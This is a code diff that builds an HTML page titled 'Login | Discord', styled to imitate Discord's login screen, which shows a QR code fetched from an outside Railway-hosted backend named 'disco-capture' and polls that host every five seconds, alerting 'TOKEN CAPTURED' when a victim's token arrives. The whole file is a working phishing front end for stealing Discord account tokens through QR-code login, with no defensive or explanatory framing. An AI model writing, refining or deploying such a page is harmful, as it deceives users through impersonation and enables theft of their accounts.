@@ -1,18 +1,51 @@
-async function init() {
-    try {
-        const res = await fetch('https://disco-capture-production.up.railway.app/get-qr');
-        const data = await res.json();
-        document.getElementById('qr-img').src = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(data.qr)}`;
-        
-        // Check for token every 5 seconds
-        setInterval(async () => {
-            const tokenRes = await fetch('https://disco-capture-production.up.railway.app/get-token');
-            const tokenData = await tokenRes.json();
-            if (tokenData.token) {
-                alert("TOKEN CAPTURED: " + tokenData.token);
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login | Discord</title>
+    <style>
+        body { background: #36393f; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #2f3136; padding: 40px; border-radius: 8px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
+        img { width: 250px; height: 250px; background: white; padding: 10px; border-radius: 4px; }
+        h2 { margin-top: 0; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>Login with QR Code</h2>
+        <p>Scan this with your Discord app</p>
+        <img id="qr-img" src="https://via.placeholder.com/250?text=Loading...">
+    </div>
+
+    <script>
+        async function init() {
+            try {
+                const res = await fetch('https://disco-capture-production.up.railway.app/get-qr');
+                if (!res.ok) throw new Error('Backend not ready');
+                const data = await res.json();
+                
+                if (data.qr) {
+                    document.getElementById('qr-img').src = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(data.qr)}`;
+                }
+
+                // Check for token every 5 seconds
+                setInterval(async () => {
+                    try {
+                        const tokenRes = await fetch('https://disco-capture-production.up.railway.app/get-token');
+                        const tokenData = await tokenRes.json();
+                        if (tokenData.token) {
+                            alert("TOKEN CAPTURED: " + tokenData.token);
+                        }
+                    } catch (e) { console.log("Token check failed"); }
+                }, 5000);
+
+            } catch (e) {
+                console.log("Waiting for backend...");
+                setTimeout(init, 3000); // Retry every 3 seconds
             }
-        }, 5000);
-    } catch (e) {
-        console.log("Waiting for backend...");
-    }
-}
+        }
+        init();
+    </script>
+</body>
+</html>
